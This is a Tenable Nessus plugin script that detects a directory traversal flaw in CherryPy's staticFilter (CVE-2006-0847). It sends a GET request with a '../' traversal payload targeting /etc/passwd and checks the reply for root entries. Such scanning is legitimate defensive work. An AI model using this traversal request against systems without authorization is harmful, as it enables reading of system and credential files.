#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description) {
  script_id(20961);
  script_version("$Revision: 1.14 $");

  script_cve_id("CVE-2006-0847");
  script_bugtraq_id(16760);
  script_osvdb_id(23367);

  script_name(english:"CherryPy staticFilter Traversal Arbitrary File Access");
  script_summary(english:"Checks for staticFilter directory traversal vulnerability in CherryPy");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is prone to directory traversal attacks." );
 script_set_attribute(attribute:"description", value:
"The remote host is running CherryPy, a web server powered by Python. 

The installed version of CherryPy fails to filter directory traversal
sequences from requests that pass through its 'staticFilter' module. 
An attacker can exploit this issue to read arbitrary files on the
remote host subject to the privileges under which the affected
application runs." );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?11e78d5a" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to CherryPy version 2.1.1 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/02/22");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/01/10");
 script_cvs_date("$Date: 2011/03/14 21:48:02 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2011 Tenable Network Security, Inc.");

  script_dependencies("webmirror.nasl", "http_version.nasl");
  script_require_ports("Services/www", 8080);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:8080);


# Make sure the banner is from CherryPy.
banner = get_http_banner(port:port);
if (
  !banner ||
  "Server: CherryPy" >!< banner
) exit(0);


# Loop through known directories.
dirs = get_kb_list(string("www/", port, "/content/directories"));

foreach dir (dirs) {
  # Try to exploit the flaw to read a file.
  file = "/../../../../../../../../../../../../etc/passwd";
  r = http_send_recv3(method: "GET", item:string(dir, file), port:port);
  if (isnull(r)) exit(0);

  # There's a problem if it looks like the passwd file.
  if (egrep(pattern:"root:.*:0:[01]:", string: r[2])) {
    report = string(
      "Here are the contents of the file '/etc/passwd' that Nessus\n",
      "was able to read from the remote host by requesting\n",
      "'", dir, file, "' :\n",
      "\n",
      r[2]
    );

    security_warning(port:port, extra:report);
    exit(0);
  }
}
